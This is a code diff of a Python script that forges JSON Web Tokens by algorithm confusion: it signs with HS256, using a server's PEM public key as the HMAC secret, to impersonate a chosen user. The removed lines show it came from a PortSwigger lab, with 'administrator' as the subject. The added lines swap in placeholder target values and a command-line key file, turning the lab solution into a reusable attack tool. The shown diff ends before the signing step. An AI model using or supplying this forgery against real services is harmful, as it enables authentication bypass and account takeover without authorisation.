@@ -2,21 +2,24 @@ import hmac
 import hashlib
 import base64
 import json
+import sys
 
 def b64url(data):
     return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
 
-with open("16ea043a4514d4fd_65537_x509.pem", "rb") as f:
+pem_file = sys.argv[1]  # pass PEM filename as argument
+
+with open(pem_file, "rb") as f:
     secret = f.read()
 
 header = {
-    "kid": "87cba841-1b7f-4fdf-8faf-9c351b2694e6",
+    "kid": "TARGET_KID_VALUE",
     "alg": "HS256"
 }
 
 payload = {
-    "iss": "portswigger",
-    "sub": "administrator",
+    "iss": "TARGET_ISSUER",
+    "sub": "TARGET_USERNAME",
     "exp": 9999999999
 }
 
